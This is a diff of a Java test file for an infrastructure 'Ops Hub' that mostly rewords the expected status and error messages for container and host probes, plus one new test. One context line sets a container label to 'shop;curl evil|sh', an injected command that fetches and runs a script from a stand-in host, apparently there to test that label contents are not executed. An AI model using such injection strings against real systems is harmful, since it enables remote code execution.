@@ -27,6 +27,7 @@ import org.nmox.studio.infra.ops.provider.HostRecord;
 import org.nmox.studio.infra.ops.provider.HostSpec;
 import org.nmox.studio.infra.ops.provider.OpsProvider;
 import org.nmox.studio.infra.ops.provider.SimulatedWorld;
+import org.nmox.studio.infra.ops.remote.HostProbe;
 import org.nmox.studio.infra.ops.remote.RemoteRunner;
 import org.nmox.studio.infra.ops.remote.SshTarget;
 
@@ -432,8 +433,8 @@ class OpsHubTest {
         assertThat(rr.commands).startsWith(offer[0].plan().run(), offer[0].plan().verify());
         assertThat(rr.commands.get(0)).endsWith(" nmox/shop:200");
         assertThat(hub.feed()).extracting(OpsEvent::text)
-                .anyMatch(t -> t.contains("back from 300 to 200"))
-                .anyMatch(t -> t.contains("shop on box is back on 200"));
+                .anyMatch(t -> t.contains("back from image 300 to image 200"))
+                .anyMatch(t -> t.contains("shop on box runs image 200 again"));
         assertThat(onlyService(hub).facts.get("image")).as("the probe after reads the new truth").isEqualTo("nmox/shop:200");
     }
 
@@ -460,12 +461,13 @@ class OpsHubTest {
         rr.ports = "3000/tcp";
         hub.probe(host);
         ssh.drain(2);
-        assertThat(ask.get()).contains("publishes no single port");
+        assertThat(ask.get()).contains("has no port mapping the Hub can read");
         rr.ports = "0.0.0.0:80->3000/tcp";
         rr.image = "someone/else:1";
         hub.probe(host);
         ssh.drain(2);
-        assertThat(ask.get()).as("the label is ours but the image is not").contains("was not deployed from NMOX Studio");
+        assertThat(ask.get()).as("the label is ours but the image is not: said as that, not as \"not deployed from here\"")
+                .contains("runs someone/else:1, which is not an image NMOX Studio tagged");
         rr.image = "nmox/shop:300";
         rr.label = "nmox.ops.app=shop;curl evil|sh";
         hub.probe(host);
@@ -662,7 +664,7 @@ class OpsHubTest {
         ssh.drain(1);
         cloud.drain(1);
         assertThat(hub.topology().node("scripted:7")).as("the provider says there is no such server").isNull();
-        assertThat(hub.feed()).extracting(OpsEvent::text).anyMatch(t -> t.contains("brief no longer exists at Scripted"));
+        assertThat(hub.feed()).extracting(OpsEvent::text).anyMatch(t -> t.contains("brief is no longer listed by Scripted"));
     }
 
     @Test
@@ -678,7 +680,7 @@ class OpsHubTest {
             cloud.drain(1);
             ssh.drain(1);
         }
-        assertThat(hub.feed()).extracting(OpsEvent::text).anyMatch(t -> t.contains("did not become ready within 15 minutes"));
+        assertThat(hub.feed()).extracting(OpsEvent::text).anyMatch(t -> t.contains("is not ready after 15 minutes"));
         assertThat(node.status).isEqualTo(HostStatus.UNREACHABLE);
         assertThat(node.status.inProgress()).isFalse();
     }
@@ -709,7 +711,7 @@ class OpsHubTest {
         OpsNode off = hub.applyRecord(provider, new HostRecord("3", "gamma", "203.0.113.3", false, "off", Map.of()));
         assertThat(off.status).isEqualTo(HostStatus.UNREACHABLE);
         assertThat(off.status.inProgress()).as("nothing to sweep for").isFalse();
-        assertThat(off.lastProblem).isEqualTo("Scripted reports it off");
+        assertThat(off.lastProblem).isEqualTo("Scripted reports this server as: off");
         OpsNode fresh = hub.applyRecord(provider, new HostRecord("4", "delta", null, false, "new", Map.of()));
         assertThat(fresh.status).isEqualTo(HostStatus.PROVISIONING);
     }
@@ -731,9 +733,9 @@ class OpsHubTest {
         ssh.drain(2);
         assertThat(host.status).as("ssh answers: it is reachable").isEqualTo(HostStatus.READY);
         assertThat(hub.feed()).extracting(OpsEvent::text)
-                .anyMatch(t -> t.contains("cloud-init ended in error"))
+                .anyMatch(t -> t.contains("cloud-init reports: error"))
                 .noneMatch(t -> t.contains("cloud-init done"));
-        assertThat(host.lastProblem).contains("cloud-init ended in error");
+        assertThat(host.lastProblem).contains("cloud-init reports: error");
     }
 
     @Test
@@ -841,5 +843,16 @@ class OpsHubTest {
         assertThat(OpsHub.knownHostsName("203.0.113.5", 2222)).isEqualTo("[203.0.113.5]:2222");
         assertThat(OpsHub.knownHostsName("[::1]", 22)).isEqualTo("::1");
         assertThat(OpsHub.knownHostsName("[::1]", 2222)).isEqualTo("[::1]:2222");
+    }
+
+    @Test
+    @DisplayName("a probe's own reasons are worded where they are shown; somebody else's words are passed on as said")
+    void probeReasonsAreWorded() {
+        assertThat(OpsHub.problemText(HostProbe.Reading.trouble(HostProbe.Trouble.NO_ANSWER, 25))).isEqualTo("no answer within 25 seconds");
+        assertThat(OpsHub.problemText(HostProbe.Reading.trouble(HostProbe.Trouble.SILENT_EXIT, 255)))
+                .isEqualTo("ssh ended with exit code 255 and said nothing");
+        assertThat(OpsHub.problemText(HostProbe.Reading.trouble(HostProbe.Trouble.TOO_MANY_LINES, 2000))).contains("more than 2000 lines");
+        assertThat(OpsHub.problemText(HostProbe.Reading.said("Connection refused"))).isEqualTo("Connection refused");
+        assertThat(OpsHub.problemText(HostProbe.Reading.of(null))).as("no trouble, no words").isNull();
     }
 }
